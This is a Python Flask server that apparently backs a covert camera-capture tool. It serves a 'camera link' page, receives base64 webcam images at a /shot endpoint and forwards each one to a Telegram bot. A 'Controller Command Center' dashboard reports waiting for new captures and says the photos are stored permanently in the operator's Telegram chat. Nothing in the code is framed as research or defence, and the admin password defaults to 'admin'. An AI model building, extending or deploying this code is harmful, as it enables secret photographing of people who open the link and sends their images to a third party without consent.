from flask import Flask, request, send_file, jsonify, Response
from werkzeug.middleware.proxy_fix import ProxyFix
import os, base64, datetime, binascii, requests

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin")

def check_auth(auth):
    return auth and auth.username == "admin" and auth.password == ADMIN_PASSWORD

@app.route("/")
def index():
    return send_file("index.html")

# --- NEW BEAUTIFUL DASHBOARD ---
@app.route("/gallery")
def gallery():
    auth = request.authorization
    if not check_auth(auth):
        return Response('Login required', 401, {'WWW-Authenticate': 'Basic realm="Admin"'})
    
    # Create the link to open your Telegram chat directly
    tg_link = f"https://t.me/{TELEGRAM_CHAT_ID}" if TELEGRAM_CHAT_ID else "#"
    
    html = f"""
    <!doctype html>
    <html><head><title>Controller Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root {{ --bg: #0f172a; --card: #1e293b; --text: #e2e8f0; --accent: #38bdf8; --danger: #ef4444; --tg: #229ED9; }}
        body {{ font-family: system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }}
        .header {{ display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 15px; margin-bottom: 20px; }}
        .header h1 {{ margin: 0; color: var(--accent); font-size: 24px; }}
        .btn {{ background: var(--accent); color: #0f172a; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; text-decoration: none; font-size: 14px; transition: 0.2s; display: inline-block; }}
        .btn:hover {{ opacity: 0.8; }}
        .btn-tg {{ background: var(--tg); color: white; font-size: 16px; padding: 15px 30px; display: block; margin: 20px auto; text-align: center; max-width: 300px; border-radius: 50px; box-shadow: 0 4px 15px rgba(34, 158, 217, 0.4); }}
        .btn-tg:hover {{ transform: scale(1.05); }}
        
        .stats {{ display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }}
        .stat-box {{ background: var(--card); padding: 20px; border-radius: 12px; flex: 1; min-width: 200px; border: 1px solid #334155; text-align: center; }}
        .stat-box h3 {{ margin: 0 0 10px 0; font-size: 14px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }}
        .stat-box p {{ margin: 0; font-size: 32px; font-weight: bold; color: var(--accent); }}
        
        .terminal {{ background: #000; border-radius: 8px; padding: 20px; font-family: monospace; color: #10b981; border: 1px solid #334155; margin-top: 20px; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }}
        .terminal span {{ color: #64748b; }}
    </style>
    <script>
        function refreshPage() {{
            window.location.reload();
        }}
    </script>
    </head><body>
    
    <div class="header">
        <h1>📷 Controller Command Center</h1>
        <div>
            <button class="btn" onclick="refreshPage()">🔄 Sync Status</button>
            <a href="/" class="btn" style="background:#334155; color:white;">Open Camera Link</a>
        </div>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>Server Status</h3>
            <p style="color:#10b981">Online</p>
        </div>
        <div class="stat-box">
            <h3>Telegram Bot</h3>
            <p style="color:{'#10b981' if TELEGRAM_TOKEN else '#ef4444'}">{'Connected' if TELEGRAM_TOKEN else 'Error'}</p>
        </div>
        <div class="stat-box">
            <h3>Storage</h3>
            <p style="color:#38bdf8">Cloud (Telegram)</p>
        </div>
    </div>

    <a href="{tg_link}" target="_blank" class="btn btn-tg">
        ✈️ Open Telegram to View Photos
    </a>

    <div class="terminal">
        <span>[SYSTEM LOG]</span><br>
        > Camera Link Active: <span>{request.host_url}</span><br>
        > Telegram Integration: <span>Active</span><br>
        > Waiting for new captures...<br>
        > Photos are automatically forwarded to your Telegram bot.<br>
        > Once sent, they are permanently saved in your Telegram chat.
    </div>

    </body></html>
    """
    return html

@app.route("/shot", methods=["POST"])
def shot():
    data = request.get_json(force=True)
    b64 = (data.get("img") or "").split(",", 1)[-1]
    
    if b64 and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            img_data = base64.b64decode(b64)
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': ('image.jpg', img_data, 'image/jpeg')}
            payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📸 New capture: {datetime.datetime.utcnow():%Y-%m-%d %H:%M:%S}"}
            
            response = requests.post(url, data=payload, files=files)
            if response.status_code != 200:
                print("Telegram Error:", response.text)
        except Exception as e:
            print("Error processing image:", e)
            
    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
